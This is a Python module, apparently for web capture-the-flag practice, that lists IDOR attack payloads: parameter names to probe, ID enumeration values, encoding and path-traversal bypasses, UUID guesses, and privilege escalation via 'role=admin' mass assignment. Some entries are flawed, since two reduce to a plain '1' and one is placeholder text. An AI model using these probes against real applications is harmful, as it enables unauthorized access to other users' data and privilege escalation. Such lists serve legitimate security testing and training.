"""
IDOR (Insecure Direct Object Reference) Payload Crafter for Web CTF.
Covers parameter enumeration, encoding bypasses, and object reference manipulation.
"""

from typing import List, Dict


def get_idor_parameters() -> List[str]:
    """Common parameter names used for object references."""
    return [
        "id", "user_id", "userId", "uid", "user", "account", "account_id",
        "profile", "profile_id", "file", "file_id", "doc", "document",
        "order", "order_id", "invoice", "invoice_id", "message", "msg",
        "post", "post_id", "comment", "comment_id", "product", "product_id",
        "item", "item_id", "download", "download_id", "attachment", "attachment_id",
        "image", "image_id", "photo", "photo_id", "video", "video_id",
        "token", "key", "ref", "reference", "object", "object_id", "resource"
    ]


def get_idor_numeric_payloads() -> List[Dict[str, str]]:
    """Generate numeric IDOR payloads for sequential ID enumeration."""
    return [
        {"name": "ID 0", "payload": "0", "desc": "Some systems use 0 as default/admin."},
        {"name": "ID 1", "payload": "1", "desc": "First record (often admin)."},
        {"name": "ID 2", "payload": "2", "desc": "Second record."},
        {"name": "Negative ID", "payload": "-1", "desc": "Negative IDs may bypass checks."},
        {"name": "Large ID", "payload": "999999999", "desc": "Large ID to test boundary handling."},
        {"name": "Float ID", "payload": "1.5", "desc": "Float ID may cause type confusion."},
        {"name": "String Number", "payload": "1", "desc": "String representation may bypass int checks."},
        {"name": "Array ID", "payload": "id[]=1", "desc": "Array injection to bypass string comparison."}
    ]


def get_idor_encoding_bypasses() -> List[Dict[str, str]]:
    """Generate IDOR payloads using encoding to bypass filters."""
    return [
        {
            "name": "URL-Encoded ID",
            "payload": "%31",
            "desc": "URL-encoded '1' bypasses numeric filters."
        },
        {
            "name": "Double URL-Encoded ID",
            "payload": "%2531",
            "desc": "Double URL-encoded '1' bypasses single decode."
        },
        {
            "name": "Hex-Encoded ID",
            "payload": "0x31",
            "desc": "Hex representation of '1'."
        },
        {
            "name": "Unicode-Encoded ID",
            "payload": "\u0031",
            "desc": "Unicode escape of '1'."
        },
        {
            "name": "Plus Sign Padding",
            "payload": "+1",
            "desc": "Plus sign may be stripped to reveal '1'."
        },
        {
            "name": "Whitespace Padding",
            "payload": " 1 ",
            "desc": "Whitespace may be trimmed to reveal '1'."
        },
        {
            "name": "Null Byte ID",
            "payload": "1%00",
            "desc": "Null byte truncation (legacy)."
        },
        {
            "name": "Trailing Dot",
            "payload": "1.",
            "desc": "Trailing dot may be normalized to '1'."
        }
    ]


def get_idor_uuid_payloads() -> List[Dict[str, str]]:
    """Generate IDOR payloads for UUID-based object references."""
    return [
        {
            "name": "Zero UUID",
            "payload": "00000000-0000-0000-0000-000000000000",
            "desc": "All-zero UUID may map to a default object."
        },
        {
            "name": "Sequential UUID",
            "payload": "00000000-0000-0000-0000-000000000001",
            "desc": "Sequential UUID enumeration."
        },
        {
            "name": "Version 1 UUID (Time-based)",
            "payload": "Predictable time-based UUID",
            "desc": "v1 UUIDs embed timestamps and can be predicted."
        },
        {
            "name": "Short UUID",
            "payload": "1",
            "desc": "Short ID may be accepted if server truncates."
        }
    ]


def get_idor_authorization_bypasses() -> List[Dict[str, str]]:
    """Generate IDOR payloads that bypass authorization checks."""
    return [
        {
            "name": "Change HTTP Method",
            "payload": "GET -> POST / PUT / DELETE",
            "desc": "Authorization may only be enforced on certain methods."
        },
        {
            "name": "Add Trailing Slash",
            "payload": "/api/user/1/",
            "desc": "Trailing slash may bypass route-based auth."
        },
        {
            "name": "Add Query Parameter",
            "payload": "/api/user/1?admin=true",
            "desc": "Extra query param may bypass auth middleware."
        },
        {
            "name": "Case Variation",
            "payload": "/api/User/1",
            "desc": "Case variation may bypass route matching."
        },
        {
            "name": "Path Traversal in ID",
            "payload": "/api/user/../admin/1",
            "desc": "Path traversal in object reference."
        },
        {
            "name": "Double Encoding in Path",
            "payload": "/api/user/%2e%2e/admin/1",
            "desc": "Encoded path traversal."
        },
        {
            "name": "Mass Assignment via ID",
            "payload": "id=1&role=admin",
            "desc": "Include extra fields to escalate privileges."
        }
    ]
